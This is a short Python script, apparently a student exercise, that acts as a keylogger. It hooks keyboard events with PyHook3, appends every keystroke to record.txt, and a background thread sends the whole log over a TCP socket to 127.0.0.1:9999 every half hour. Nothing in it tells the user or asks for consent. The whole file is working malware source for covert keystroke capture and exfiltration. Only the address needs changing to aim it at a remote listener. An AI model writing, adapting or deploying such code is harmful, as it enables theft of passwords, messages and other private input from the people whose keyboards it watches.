import socket
import pythoncom
import PyHook3 as pyHook
import time
import threading


def thread_it(func):

    t = threading.Thread(target=func)
    t.setDaemon(False)
    t.start()

def send_record():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect(('127.0.0.1', 9999))
            print('连接成功')
        except Exception as e:
                        # tkinter.messagebox.showerror('很抱歉', '现在不是交作业时间')
            return        
        with open('record.txt', 'rb') as fp:
            sock.send(fp.read())
        sock.close()
        time.sleep(1800)
    
def onKeyboardEvent(event):
    key = event.Key
    with open('record.txt','a+') as f:
        f.write(key+"#")
    return True

def record():
    hm = pyHook.HookManager() 
    hm.KeyDown = onKeyboardEvent 
    hm.HookKeyboard() 
    pythoncom.PumpMessages() 

threading.Thread(target=record).start()
threading.Thread(target=send_record).start()
